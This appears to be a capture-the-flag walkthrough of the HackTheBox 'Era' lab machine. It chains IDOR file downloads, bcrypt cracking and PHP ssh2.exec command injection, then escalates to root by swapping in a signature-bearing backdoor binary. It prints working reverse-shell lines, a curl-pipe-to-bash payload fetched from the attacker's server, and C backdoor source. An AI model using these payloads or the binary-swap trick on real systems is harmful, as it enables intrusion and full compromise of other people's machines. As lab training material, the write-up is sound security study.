---
categories:
- Hackthebox
image:
  path: era.png
layout: post
media_subpath: /assets/images/era
tags:
- hackthebox
- writeup
- linux
- ftp
- idor
- sqlite
- bcrypt-cracking
- php-stream-wrapper
- ssh2-exec
- binary-patching
- objcopy
- av-evasion
- medium
title: HTB - Era Walkthrough
---

## Introduction

Era is a medium-difficulty Linux machine that demonstrates multiple attack techniques including IDOR vulnerability exploitation, SQLite database analysis, bcrypt password cracking, FTP enumeration, PHP stream wrapper abuse via SSH2, lateral movement, and finally binary modification with signature preservation to bypass security controls.


## Reconnaissance

### Port Scanning

Initial `nmap` scan reveals two open ports

```bash
nmap -sC -sV -oA nmap/era 10.10.11.79        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 03:54 UTC
Nmap scan report for era.htb (10.10.11.79)
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Era Designs
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.47 seconds
```
**Key Findings:**

- **Port 21/tcp:** vsftpd 3.0.5
- **Port 80/tcp:** nginx 1.18.0 (Ubuntu)
- Domain: `era.htb` (redirected)

No known exploits for these versions:
```bash
searchsploit vsftpd 3.0.5
Exploits: No Results
Shellcodes: No Results

searchsploit nginx 1.18.0
Exploits: No Results
Shellcodes: No Results
```
### FTP Enumeration

Anonymous FTP access is disabled:

```bash
ftp anonymous@10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
### Web Enumeration

Add domain to hosts file:

```
echo "10.10.11.79   era.htb" | tee -a /etc/hosts
```

Visiting the website reveals a static page for "Era Designs":

![img](Pasted image 20250729071157.png)
### Virtual Host Discovery

```bash
ffuf -u http://era.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100 -ic
<SNIP>
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 465ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 272ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2544ms]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 271ms]


ffuf -u http://era.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -H 'HOST: FUZZ.era.htb' -fl 8
<SNIP>
file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 397ms]
```

**Found:** `file.era.htb`

Add to hosts file:

```bash
echo "10.10.11.79   file.era.htb" | tee -a /etc/hosts
```

### File.era.htb Enumeration

![img](Pasted image 20250729071849.png)

The site appears to be a file management application with login functionality.

![img](Pasted image 20250729072403.png)

Directory brute forcing reveals additional endpoints:

```bash
ffuf -u http://file.era.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100 -ic -e .php -fs 6765
<SNIP>
login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 306ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 310ms]
register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 303ms]
files                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 288ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1129ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 270ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 271ms]
layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 271ms]
logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 275ms]
manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 272ms]
```

## Initial Access - User Registration

### Account Creation

Register a new account and log in:

![img](Pasted image 20250729072922.png)

### File Upload Functionality

After logging in, we can upload files. Each upload receives a download link with an `id` parameter:

![img](Pasted image 20250729073218.png)

## IDOR Vulnerability Discovery

### Fuzzing the ID Parameter

The `id` parameter appears vulnerable to Insecure Direct Object Reference (IDOR):

```bash
ffuf -u "http://file.era.htb/download.php?id=FUZZ" -w <(seq 1 1000) -H 'Cookie: PHPSESSID=hsuhbp5du9voduli5qg446jqtl' -fs 7686
<SNIP>
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 275ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 285ms]
:: Progress: [1000/1000] :: Job [1/1] :: 66 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

**IDs found:** 54 and 150
### Downloading Sensitive Files

Both IDs return zip files:

![img](Pasted image 20250729073758.png)  
![img](Pasted image 20250729073817.png)

### Database Analysis

Extracting the zip files reveals a SQLite database:

```bash
ls -la        
total 2796
drwxrwxr-x 6 kali kali    4096 Jul 29 04:40 .
drwxrwxr-x 4 kali kali    4096 Jul 29 04:40 ..
<SNIP>
-rw-r--r-- 1 kali kali   20480 Jun 29 16:20 filedb.sqlite
<SNIP>
```
Opening the database reveals a `users` table:

![img](Pasted image 20250729074306.png)

**Credentials Found:**

- `admin_ef01cab31aa` (admin)
- `yuri` (user)
- `eric` (user)

### Cracking bcrypt Hashes

```bash
hashcat --user hashes /usr/share/wordlists/rockyou.txt -m 3200
<SNIP>
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang
<SNIP>
```
**Cracked Passwords:**

- `yuri:mustang`
- `eric:america`
### FTP Access with yuri's Credentials

```bash
nxc ftp 10.10.11.79 -u usernames.txt -p passwrds.txt --continue-on-success
FTP         10.10.11.79     21     10.10.11.79      [+] yuri:mustang
FTP         10.10.11.79     21     10.10.11.79      [-] eric:mustang (Response:530 Permission denied.)
FTP         10.10.11.79     21     10.10.11.79      [-] yuri:america (Response:530 Login incorrect.)
FTP         10.10.11.79     21     10.10.11.79      [-] eric:america (Response:530 Permission denied.)
FTP         10.10.11.79     21     10.10.11.79      [-] yuri: (Response:530 Login incorrect.)
FTP         10.10.11.79     21     10.10.11.79      [-] eric: (Response:530 Permission denied.)
```

Connecting via FTP:

```bash
ftp yuri@10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6799|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
ftp>
```

Download all files:

```bash
wget -r ftp://yuri:mustang@10.10.11.79 
<SNIP>
FINISHED --2025-07-29 05:27:38--
Total wall clock time: 2m 3s
Downloaded: 41 files, 10M in 1m 5s (161 KB/s)
```

No immediate findings in the configuration files.
## Privilege Escalation to Admin via Security Questions

### Technical Concept: Security Question Bypass

The application allows login via security questions. The form only requires a username - no additional verification. By changing the security questions for the admin account, we can reset the admin password or log in directly.

Update security questions for `admin_ef01cab31aa`:

![img](Pasted image 20250729083205.png)

Log in using security questions:

![img](Pasted image 20250729083326.png)


## PHP Stream Wrapper Exploitation

### Source Code Analysis

From the downloaded zip files, reviewing `download.php` reveals a critical vulnerability:

![img](Pasted image 20250729083834.png)
**Vulnerable Code:**

```php
$format = $_GET['format'];
$file = fopen("$format://$credentials@$host:$port/$command;$file", 'r');
```

**Technical Concept: PHP Stream Wrappers**

PHP supports various stream wrappers that allow accessing different protocols like files, HTTP, FTP, SSH2, etc. The `ssh2.exec://` wrapper executes commands over SSH.

**The Vulnerability:**

- The `format` parameter is directly used in `fopen()`
- No validation on allowed wrappers
- Allows arbitrary command execution via `ssh2.exec://`
- The `;` separates the command from the file path

### Testing Command Execution

Test with `ping` to verify connectivity:

```bash
curl 'http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.11.79;' -H 'Cookie: PHPSESSID=hsuhbp5du9voduli5qg446jqtl'
Opening: ssh2.exec://yuri:mustang@10.10.11.79:22/ping 10.10.11.79;files/signing.zip
Resource id #3   

sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:53:34.359925 IP 10.10.14.19.44532 > era.htb.http: Flags [S], seq 1740702632, win 64240, options [mss 1460,sackOK,TS val 3242835181 ecr 0,nop,wscale 7], length 0
05:53:34.743715 IP era.htb.http > 10.10.14.19.44532: Flags [S.], seq 2400513584, ack 1740702633, win 65160, options [mss 1362,sackOK,TS val 1619996652 ecr 3242835181,nop,wscale 7], length 0
05:53:34.743873 IP 10.10.14.19.44532 > era.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3242835565 ecr 1619996652], length 0
05:53:34.744576 IP 10.10.14.19.44532 > era.htb.http: Flags [P.], seq 1:228, ack 1, win 502, options [nop,nop,TS val 3242835566 ecr 1619996652], length 227: HTTP: GET /download.php?id=150&show=true&format=ssh2.exec://yuri:mustang@10.10.11.79:22/ping%20-c%201%2010.10.11.79; HTTP/1.1
05:53:35.245637 IP era.htb.http > 10.10.14.19.44532: Flags [.], ack 228, win 508, options [nop,nop,TS val 1619997088 ecr 3242835566], length 0
05:53:35.253893 IP era.htb.http > 10.10.14.19.44532: Flags [P.], seq 1:390, ack 228, win 508, options [nop,nop,TS val 1619997197 ecr 3242835566], length 389: HTTP: HTTP/1.1 200 OK
05:53:35.253968 IP 10.10.14.19.44532 > era.htb.http: Flags [.], ack 390, win 501, options [nop,nop,TS val 3242836075 ecr 1619997197], length 0
05:53:35.255114 IP 10.10.14.19.44532 > era.htb.http: Flags [F.], seq 228, ack 390, win 501, options [nop,nop,TS val 3242836076 ecr 1619997197], length 0
05:53:35.646882 IP era.htb.http > 10.10.14.19.44532: Flags [F.], seq 390, ack 229, win 508, options [nop,nop,TS val 1619997522 ecr 3242836076], length 0
05:53:35.646947 IP 10.10.14.19.44532 > era.htb.http: Flags [.], ack 391, win 501, options [nop,nop,TS val 3242836468 ecr 1619997522], length 0
```

### Reverse Shell via SSH2

**Step 1 - Create Reverse Shell Script:**

```bash
cat shell.sh 
/bin/bash -i >& /dev/tcp/10.10.14.19/9001 0>&1
```

**Step 2 - Start HTTP Server and Listener:**

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<SNIP>

rlwrap nc -nlvp 9001
listening on [any] 9001 ...
```

**Step 3 - Execute Payload:**

```bash
curl 'http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/curl%20http://10.10.14.19:8000/shell.sh%20|bash;' -H 'Cookie: PHPSESSID=hsuhbp5du9voduli5qg446jqtl'
Opening: ssh2.exec://yuri:mustang@127.0.0.1:22/curl http://10.10.14.19:8000/shell.sh |bash;files/signing.zip
Resource id #3     
```

**Shell Obtained:**

```bash
rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.79] 60840
bash: cannot set terminal process group (18090): Inappropriate ioctl for device
bash: no job control in this shell
yuri@era:~$
```

## Lateral Movement to eric

### Switch User

```bash
yuri@era:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 Jul 22 08:42 .
drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..
drwxr-x---  5 eric eric 4096 Jul 22 08:42 eric
drwxr-x---  3 yuri yuri 4096 Jul 29 06:07 yuri
yuri@era:/home$ su - eric
su - eric
Password: america
id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

**User flag:** `/home/eric/user.txt`

## Privilege Escalation to root

### Discovery of AV Binary

Checking `/opt` reveals an interesting directory:

```bash
eric@era:/opt$ ls -la               ls -la
ls -la
total 12
drwxrwxr-x  3 root root 4096 Jul 22 08:42 .
drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..
drwxrwxr--  3 root devs 4096 Jul 22 08:42 AV
```

The user `eric` is in the `devs` group, granting access.

```bash
eric@era:/opt$ id                   id
id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
eric@era:/opt$ 
```

**Key Observations:**

- `monitor` binary is owned by `root` with group `devs`
- We have write permissions (group `devs` can write)
- The binary appears to run periodically (status.log updates over time)

### Technical Challenge: Binary Signature Detection

A naive replacement of the binary would likely trigger security controls (AV/EDR). The solution involves preserving the binary's signature while injecting a reverse shell payload.

### Binary Modification with Signature Preservation

**Step 1 - Create Backdoor C Code:**

```
#include <stdlib.h>

int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.19/4444 0>&1'");
    return 0;
}
```

**Step 2 - Compile Statically:**

```
gcc -static -o monitor_backdoor backdoor.c
```

**Technical Concept:** Static compilation embeds all libraries into the binary, making it self-contained and less likely to fail on the target system.

**Step 3 - Extract Signature from Original Binary:**

```
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
```

**Technical Concept:** Many security solutions embed signatures or hash values in binaries for integrity checking. The `.text_sig` section likely contains such a signature.

**Step 4 - Inject Signature into Backdoor:**

```
objcopy --add-section .text_sig=sig --set-section-flags .text_sig=noload,readonly monitor_backdoor monitor_backdoor_sig
```

**What this does:**

- `--add-section`: Adds the extracted signature section
- `--set-section-flags .text_sig=noload,readonly`: Marks section as not loaded in memory and read-only
- The signature is present for verification but doesn't affect execution

**Step 5 - Replace the Binary:**

```
cp monitor_backdoor_sig /opt/AV/periodic-checks/monitor
```

### Technical Concept: Why This Works

1. **Signature Check:** The monitoring service likely checks for the presence of the signature section or a hash of it
2. **Section Flags:** `noload` means the section isn't loaded into memory during execution
3. **Our Payload:** The actual code remains functional while passing integrity checks

### Root Shell

Start listener:

```
rlwrap nc -nlvp 4444
```

Wait for the scheduled task to execute (automatically runs on interval):

```
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.79] 51878
bash: cannot set terminal process group (145644): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~#
```

**Root flag:** `/root/root.txt`




